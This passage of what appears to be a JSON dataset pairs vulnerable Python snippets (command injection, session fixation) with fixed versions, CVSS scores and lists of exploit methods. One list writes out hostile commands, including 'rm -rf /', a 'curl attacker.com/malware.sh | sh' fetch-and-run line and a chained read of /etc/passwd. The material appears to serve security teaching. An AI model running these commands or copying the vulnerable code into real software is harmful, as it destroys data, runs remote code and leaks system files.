\"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import os\\nimport http.cookies\\n\\ndef handle_request(environ, start_response):\\n    if 'HTTP_COOKIE' in environ:\\n        cookie = http.cookies.SimpleCookie(environ['HTTP_COOKIE'])\\n        session_id = cookie.get('session_id')\\n        if not session_id:\\n            session_id = os.urandom(16).hex()\\n            response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\\n        else:\\n            response_headers = []\\n    else:\\n        session_id = os.urandom(16).hex()\\n        response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\\n\\n    response_body = b'Hello, world!'\\n    start_response('200 OK', response_headers)\\n    return [response_body]",
      "vulnerability_type": "Session Fixation (Low Severity)",
      "cvss_score": 3.6,
      "fixed_code": "import os\\nimport http.cookies\\n\\ndef handle_request(environ, start_response):\\n    session_id = None\\n    if 'HTTP_COOKIE' in environ:\\n        cookie = http.cookies.SimpleCookie(environ['HTTP_COOKIE'])\\n        session_id = cookie.get('session_id')\\n    if not session_id or not is_valid_session(session_id.value):\\n        session_id = os.urandom(16).hex()\\n        response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\\n    else:\\n        response_headers = []\\n\\n    response_body = b'Hello, world!'\\n    start_response('200 OK', response_headers)\\n    return [response_body]\\n\\ndef is_valid_session(session_id):\\n    # Implement session validation logic here\\n    return False",
      "exploit_ways": [
        "An attacker can provide a fixed session ID to the server, and if accepted, hijack the user's session.",
        "By manipulating cookies in a web browser, an attacker could attempt to reuse valid session IDs from another user.",
        "In environments where sessions are not properly invalidated, an attacker might be able to exploit fixed sessions to maintain unauthorized access."
      ]
    }
  }
]